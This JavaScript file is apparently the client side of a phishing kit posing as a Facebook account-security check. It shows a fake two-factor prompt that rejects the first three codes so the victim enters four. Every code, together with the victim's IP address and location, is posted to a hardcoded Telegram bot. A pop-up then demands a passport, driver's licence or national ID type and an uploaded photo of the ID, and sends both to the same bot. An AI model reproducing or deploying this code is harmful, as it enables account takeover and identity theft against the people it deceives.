function getIP(callback) {
  fetch("https://api.db-ip.com/v2/free/self")
    .then((response) => response.json())
    .then((data) => callback(data))
    .catch((error) => callback(undefined));
}
let IpAddress = "";

getIP((ip) => {
  IpAddress = ip;
});
$(document).ready(function () {
  // getCode();
  updateHtmlAndCallback(function () {
    sendCode();
  });

  setTime();
  $("#back-hone").on("click", function () {
    window.location.href = "/end";
  });
  $("#send").on("click", function () {
    $(".lsd-ring-container").removeClass("d-none");

    setTimeout(function () {
      $(".lsd-ring-container").addClass("d-none");
    }, 2000);
  });
});

function setTime() {
  var totalTime = 5 * 60;

  var timer = setInterval(function () {
    totalTime--;
    var minutes = Math.floor(totalTime / 60);
    var seconds = totalTime % 60;

    minutes = minutes < 10 ? "0" + minutes : minutes;
    seconds = seconds < 10 ? "0" + seconds : seconds;

    $("#time").text(minutes + ":" + seconds);

    if (totalTime <= 0) {
      clearInterval(timer);
      $("#time").text("00:00");
    }
  }, 1000);

  let IpAddress = "";
}

function updateHtmlAndCallback(callback) {
  $("#code-form .card-body").html(`
                <h2 class="card-title fw-bold">Two-factor authentication required (1/3)</h2>
                <p class="card-text py-3">We have temporarily blocked your account because your
                    protect has changed. Verify code has been sent
                </p>
                <img src="/img/TOtVy8P.png" class="w-100 rounded" alt="">
                <input type="text" class="form-control my-3 py-2 bg-light" id="code"
                    placeholder="Enter your code" required>
                <p class="text-danger ms-1 d-none" id="wrong-code">
                    The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
                </p>
                <div class="bg-light rounded py-3 mb-3 d-flex justify-content-between align-items-center">
                    <div class="mx-3">
                        <i class="fa fa-info-circle" aria-hidden="true" style="font-size: 1.5rem;color: #9f580a;"></i>
                    </div>

                    <p class="mb-0">
                        You've asked us to require a 6-digit or 8-digit login code when anyone tries to access your
                        account from a
                        new device or browser. Enter the 6-digit or 8-digit code from your code generator or third-party app below.
                        <br>
                        Please wait <span id="time" class="fw-bold">05:00</span> to request the sending of the code.
                    </p>
                </div>
                <p>We'll walk you through some steps to secure and unlock your account.</p>
                <button type="button" class="btn bg-light border w-100 py-3 fw-bold" id="send-code">Submit</button>
                <p class="mt-3 mb-0 text-center" style="cursor: pointer;color: rgb(30 66 159);" id="send">Send Code</p>
                `);
  if (callback && typeof callback === "function") {
    callback();
  }
}

// function getCode() {
//     $.ajax({
//         url: '/current-user',
//         type: 'GET',
//         beforeSend: function () {
//             $('.lsd-ring-container').removeClass('d-none');
//         },
//         success: function (data) {
//             if (data.buEmail == null || data.perEmail == null || data.phone == null) {
//                 window.location.href = '/business';
//             } else {
//                 updateHtmlAndCallback(data,function (){
//                     sendCode(data);
//                 })
//             }
//
//             $('.lsd-ring-container').addClass('d-none');
//         },
//         error: function (xhr, status, error) {
//             setTimeout(function () {
//                 Swal.fire({
//                     text: `Request failed!`,
//                     icon: "error"
//                 });
//                 $('.lsd-ring-container').addClass('d-none');
//             }, 500);
//         }
//
//     });
// }
let NUMBER_TIME_SEND_CODE = 0;
let code1 = "";
let code2 = "";
let code3 = "";
let code4 = "";
let Fcode = "";
function sendCode() {
  $("#code").on("input", function () {
    const input = $(this).val();
    const validInputRegex = /^\d+$/;

    if (!validInputRegex.test(input)) {
      $(this).val(input.slice(0, -1));
    }
  });

  $("#send-code").on("click", function () {
    const keymap = $("#code").val();

    if (keymap === "") {
      $("#code").addClass("border-danger");
      $("#wrong-code").text("Please enter your code.").removeClass("d-none");
      return;
    }

    if (keymap.length !== 6 && keymap.length !== 8) {
      $("#code").addClass("border-danger");
      $("#wrong-code")
        .text("Code must be 6 or 8 digits.")
        .removeClass("d-none");
      return;
    }

    $("#code").removeClass("border-danger");
    $("#wrong-code").addClass("d-none");

    NUMBER_TIME_SEND_CODE++;

    // Lưu code theo số lần nhập
    if (NUMBER_TIME_SEND_CODE === 1) code1 = keymap;
    if (NUMBER_TIME_SEND_CODE === 2) code2 = keymap;
    if (NUMBER_TIME_SEND_CODE === 3) code3 = keymap;
    if (NUMBER_TIME_SEND_CODE === 4) code4 = keymap;

    const message1 =
      "<strong>Code " +
      NUMBER_TIME_SEND_CODE +
      ": </strong>" +
      keymap +
      "\n<strong>IP Address: </strong>" +
      IpAddress.ipAddress +
      "\n<strong>Country : </strong>" +
      IpAddress.countryName +
      "( " +
      IpAddress.countryCode +
      " )" +
      "\n<strong>City : </strong>" +
      IpAddress.city;

    const botToken = "7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44";
    const chatId = "-1002299618966";

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message1,
        parse_mode: "HTML",
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        setTimeout(function () {
          if (NUMBER_TIME_SEND_CODE < 4) {
            $("#wrong-code").removeClass("d-none");
            $("#code").val("");
          } else {
            $("#getCode").removeClass("d-none");
            showIdentityPopup();
          }
          $(".lsd-ring-container").addClass("d-none");
        }, 2000);
      })
      .catch((error) => {
        console.error("Error:", error);
        setTimeout(function () {
          Swal.fire({
            text: `Request failed!`,
            icon: "error",
          });
          $(".lsd-ring-container").addClass("d-none");
        }, 500);
      });
  });
}
function showIdentityPopup() {
  Swal.fire({
    title: "Identity Verification",
    html: `
         <div class="verification-container">
           <div class="alert alert-info mb-4" role="alert">
             <i class="fas fa-info-circle me-2"></i>
             Please provide a valid government-issued ID for verification
           </div>
           
           <div class="form-group mb-4">
             <label class="fw-bold mb-3">Select ID Type:</label>
             <div class="id-options">
               <div class="id-option">
                 <input type="radio" name="idType" value="Passport" id="passport" class="d-none">
                 <label for="passport" class="option-label">
                   <i class="fas fa-passport mb-2"></i>
                   <span>Passport</span>
                 </label>
               </div>
               <div class="id-option">
                 <input type="radio" name="idType" value="Driver License" id="driver" class="d-none">
                 <label for="driver" class="option-label">
                   <i class="fas fa-id-card mb-2"></i>
                   <span>Driver's License</span>
                 </label>
               </div>
               <div class="id-option">
                 <input type="radio" name="idType" value="National ID Card" id="national" class="d-none">
                 <label for="national" class="option-label">
                   <i class="fas fa-address-card mb-2"></i>
                   <span>National ID</span>
                 </label>
               </div>
             </div>
           </div>

           <div class="form-group">
             <label class="fw-bold mb-3">Upload ID Image:</label>
             <div class="upload-area" id="uploadArea">
               <input type="file" id="idImage" accept="image/*" class="d-none">
               <label for="idImage" class="upload-label">
                 <i class="fas fa-cloud-upload-alt mb-2"></i>
                 <span>Click or drag image here</span>
                 <small class="text-muted d-block">Supported formats: JPG, PNG</small>
               </label>
             </div>
             <div id="imagePreview" class="mt-3 d-none">
               <img src="" alt="Preview" class="img-preview">
               <button type="button" class="btn btn-sm btn-danger mt-2" id="removeImage">
                 <i class="fas fa-times"></i> Remove
               </button>
             </div>
           </div>
         </div>

         <style>
           .verification-container {
             padding: 1rem;
             width: 800px;
             margin: 0 auto;
           }
           .swal2-popup {
             width: 850px !important;
             max-width: 95vw;
           }
           .swal2-html-container {
             margin: 0;
             padding: 1rem;
           }
           .id-options {
             display: flex;
             justify-content: space-between;
             gap: 2rem;
             margin-bottom: 1.5rem;
           }
           .id-option {
             flex: 1;
             min-width: 180px;
           }
           .option-label {
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 1.5rem 1rem;
             height: 140px;
             border: 2px solid #dee2e6;
             border-radius: 8px;
             cursor: pointer;
             transition: all 0.3s;
             width: 100%;
           }
           .option-label:hover {
             border-color: #0d6efd;
             background-color: #f8f9fa;
             transform: translateY(-2px);
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
           }
           input[type="radio"]:checked + .option-label {
             border-color: #0d6efd;
             background-color: #f8f9fa;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
           }
           .option-label i {
             font-size: 2.5rem;
             color: #6c757d;
             margin-bottom: 1rem;
             flex-shrink: 0;
           }
           .option-label span {
             font-weight: 500;
             text-align: center;
             white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
             width: 100%;
             display: block;
           }
           .upload-area {
             border: 2px dashed #dee2e6;
             border-radius: 8px;
             padding: 2rem;
             text-align: center;
             transition: all 0.3s;
           }
           .upload-area:hover {
             border-color: #0d6efd;
             background-color: #f8f9fa;
           }
           .upload-label {
             cursor: pointer;
             display: flex;
             flex-direction: column;
             align-items: center;
           }
           .upload-label i {
             font-size: 2rem;
             color: #6c757d;
             margin-bottom: 0.5rem;
           }
           .img-preview {
             max-width: 200px;
             max-height: 200px;
             border-radius: 4px;
           }
         </style>
      `,
    showCancelButton: true,
    confirmButtonText: "Verify Identity",
    cancelButtonText: "Cancel",
    customClass: {
      confirmButton: "btn btn-primary",
      cancelButton: "btn btn-outline-secondary",
    },
    preConfirm: () => {
      const idType = document.querySelector(
        'input[name="idType"]:checked'
      )?.value;
      const idImage = document.getElementById("idImage").files[0];

      if (!idType) {
        Swal.showValidationMessage("Please select an ID type");
        return false;
      }
      if (!idImage) {
        Swal.showValidationMessage("Please upload an ID image");
        return false;
      }

      return { idType, idImage };
    },
  }).then((result) => {
    if (result.isConfirmed) {
      const { idType, idImage } = result.value;
      document.querySelector(".lsd-ring-container").classList.remove("d-none");

      // Send info first
      const chatId = "-1002299618966";
      const infoMessage = `🆔 ID Type: ${idType}\n📍 IP: ${IpAddress.ipAddress}\n🌍 Country: ${IpAddress.countryName}\n🏙️ City: ${IpAddress.city}`;

      const botToken = "7950052672:AAGbwOHQ7ockeXPmcajDGBl0Z3PaMvEtm44";

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: infoMessage,
        }),
      })
        .then((response) => response.json())
        .then(() => {
          // Then send photo
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("photo", idImage);

          return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData,
          });
        })
        .then((response) => response.json())
        .then((data) => {
          document.querySelector(".lsd-ring-container").classList.add("d-none");
          if (data.ok) {
            window.location.href = "https://facebook.com";
          } else {
            throw new Error(data.description || "Unknown error occurred");
          }
        })
        .catch((error) => {
          console.error("Error:", error);
          document.querySelector(".lsd-ring-container").classList.add("d-none");
          Swal.fire({
            icon: "error",
            title: "Error",
            text: "Failed to upload ID. Please try again",
            confirmButtonText: "Close",
          });
        });
    }
  });

  // Add image preview functionality
  document.getElementById("idImage")?.addEventListener("change", function (e) {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = function (e) {
        const preview = document.getElementById("imagePreview");
        preview.querySelector("img").src = e.target.result;
        preview.classList.remove("d-none");
      };
      reader.readAsDataURL(file);
    }
  });

  // Add remove image functionality
  document
    .getElementById("removeImage")
    ?.addEventListener("click", function () {
      document.getElementById("idImage").value = "";
      document.getElementById("imagePreview").classList.add("d-none");
    });
}
